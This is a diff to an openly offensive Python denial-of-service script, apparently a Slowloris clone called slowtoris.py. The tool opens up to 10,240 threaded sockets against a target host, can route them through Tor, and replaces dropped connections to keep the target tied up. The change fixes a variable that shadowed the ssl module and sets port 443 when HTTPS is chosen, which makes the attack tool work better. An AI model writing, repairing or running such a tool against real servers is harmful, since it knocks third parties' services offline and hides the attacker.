@@ -48,18 +48,18 @@ user_agents = [
 
 slLock = threading.Lock()
 class socketCreator (threading.Thread):
-	def __init__(self, host, port, num_sockets, ssl, socket_list):
+	def __init__(self, host, port, num_sockets, isHTTPS, socket_list):
 		threading.Thread.__init__(self)
 		self.host = host
 		self.port = port
 		self.num_sockets = num_sockets
-		self.ssl = ssl
+		self.isHTTPS = isHTTPS
 		self.socket_list = socket_list
 	def run(self):
 		s = None
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			if self.ssl:
+			if self.isHTTPS:
 				s = ssl.wrap_socket(s)
 			s.settimeout(5)
 			s.connect((self.host, self.port))
@@ -94,7 +94,7 @@ def connectTor():
     socket.socket = socks.socksocket
     print("Connected to Tor")
 
-def main(host, port, num_sockets, ssl):
+def main(host, port, num_sockets, isHTTPS):
 	print("CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::")
 	print("CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::")
 	print("CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::")
@@ -129,7 +129,7 @@ def main(host, port, num_sockets, ssl):
 	checkTarget(host, port)
 	sockThreads = []
 	for i in range(0, num_sockets):
-		sockThread = socketCreator(host, port, num_sockets, ssl, socket_list)
+		sockThread = socketCreator(host, port, num_sockets, isHTTPS, socket_list)
 		sockThreads.append(sockThread)
 		sockThread.start()
 		time.sleep(0.001)
@@ -158,7 +158,7 @@ def main(host, port, num_sockets, ssl):
 					pass
 				socket_list.remove(sock)
 		for i in range(len(socket_list), num_sockets):
-			sockThread = socketCreator(host, port, num_sockets, ssl, socket_list)
+			sockThread = socketCreator(host, port, num_sockets, isHTTPS, socket_list)
 			sockThreads.append(sockThread)
 			sockThread.start()
 			time.sleep(0.001)
@@ -171,20 +171,22 @@ if __name__ == "__main__":
 	host = None
 	port = 80
 	num_sockets = 1000
-	ssl = False
+	isHTTPS = False
 	try:
 		host = str(args[0])
 		port = int(args[1])
 		num_sockets = int(args[2])
-		ssl = str(args[3]).lower() == "y"
+		isHTTPS = str(args[3]).lower() == "y"
 	except:
 		print("Incorrect args format")
 		print("Correct args format: python3 slowtoris.py IPv4(str) port(int) num_sockets(int) isHTTPS(Y/N)")
 		exit(1)
 	if num_sockets > 10240:
 		num_sockets = 10240
+	if isHTTPS:
+		port = 443
 	
-	main(host, port, num_sockets, ssl)
+	main(host, port, num_sockets, isHTTPS)
 
 
 
